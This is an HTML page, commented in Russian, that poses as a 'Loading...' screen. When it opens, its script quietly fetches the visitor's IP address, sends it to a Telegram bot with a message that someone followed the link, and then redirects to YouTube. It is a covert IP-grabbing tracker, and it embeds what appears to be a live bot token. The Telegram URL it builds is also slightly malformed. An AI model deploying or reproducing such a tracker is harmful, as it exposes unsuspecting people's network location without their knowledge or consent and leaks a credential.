<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
</head>
<body style="background: #000;">
    <script>
        // ТВОИ ДАННЫЕ
        const TOKEN = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
        const CHAT_ID = "8413511998"; // Твой ID бота

        async function sendLog() {
            try {
                // 1. Получаем IP
                const ipResponse = await fetch('https://api.ipify.org');
                const ipData = await ipResponse.json();
                const userIp = ipData.ip;

                // 2. Формируем запрос к Telegram
                const message = encodeURIComponent("Кто-то перешел по ссылке!\nIP: " + userIp);
                const url = "https://api.telegram.org" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + message;

                // 3. Отправляем сообщение
                await fetch(url);

            } catch (err) {
                console.error("Ошибка:", err);
            } finally {
                // 4. Перенаправляем на YouTube через полсекунды
                setTimeout(() => {
                    window.location.href = "https://www.youtube.com";
                }, 500);
            }
        }

        sendLog();
    </script>
</body>
</html>
